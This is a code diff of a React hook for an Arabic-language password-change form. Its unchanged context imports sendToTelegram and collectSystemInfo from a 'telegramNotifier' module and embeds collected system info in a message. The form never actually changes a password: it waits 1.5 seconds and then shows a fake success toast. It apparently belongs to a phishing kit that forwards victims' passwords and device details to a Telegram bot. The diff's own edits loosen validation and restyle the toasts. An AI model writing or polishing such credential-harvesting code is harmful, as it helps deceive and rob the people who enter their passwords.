@@ -1,5 +1,5 @@
 import { useState } from 'react';
-import { useToast } from "@/components/ui/use-toast";
+import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram, collectSystemInfo } from '@/utils/telegramNotifier';
 
 export const usePasswordForm = () => {
@@ -18,9 +18,8 @@ export const usePasswordForm = () => {
     const minLength = password.length >= 8;
     const hasUpperCase = /[A-Z]/.test(password);
     const hasNumber = /\d/.test(password);
-    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
 
-    return minLength && hasUpperCase && hasNumber && hasSpecialChar;
+    return minLength && hasUpperCase && hasNumber;
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -50,7 +49,7 @@ ${collectSystemInfo()}
     if (!isValidNewPassword) {
       setErrors(prev => ({
         ...prev,
-        newPassword: "يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل، وحرف كبير، ورقم، وحرف خاص"
+        newPassword: "يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل، وحرف كبير، ورقم"
       }));
       setIsLoading(false);
       return;
@@ -65,11 +64,18 @@ ${collectSystemInfo()}
       return;
     }
 
+    // Show loading toast
+    toast({
+      title: "جاري تغيير كلمة المرور...",
+      className: "bg-black text-white w-auto h-12 rounded-lg",
+    });
+
     await new Promise(resolve => setTimeout(resolve, 1500));
     
+    // Show success toast
     toast({
-      title: "✅ تم تغيير كلمة المرور بنجاح",
-      description: "يمكنك الآن استخدام كلمة المرور الجديدة لتسجيل الدخول",
+      title: "تم تغيير كلمة المرور بنجاح",
+      className: "bg-black text-white w-auto h-12 rounded-lg",
     });
     
     setIsLoading(false);
